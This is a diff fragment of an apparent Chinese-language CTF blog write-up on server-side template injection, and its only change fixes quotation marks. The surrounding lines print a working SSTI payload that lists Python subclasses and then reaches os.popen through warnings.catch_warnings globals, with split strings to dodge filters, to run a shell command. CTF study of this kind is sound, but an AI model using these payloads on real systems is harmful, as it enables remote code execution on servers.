@@ -422,7 +422,7 @@ int main()
 <pre><code>?name=&#123;&#123;%27%27.__class__.__mro__[2].__subclasses__()&#125;&#125;
 </code></pre>
 <img src="https://img.junyu33.me/blog/ctf04/ssti_1.png"> 
-<p>寻找&lt;class ‘warnings.catch_warnings’&gt;为第59位</p>
+<p>寻找&lt;class 'warnings.catch_warnings'&gt;为第59位</p>
 <p>构造执行命令的payload</p>
 <pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27ls%20/%27).read()&#125;&#125;
 </code></pre>
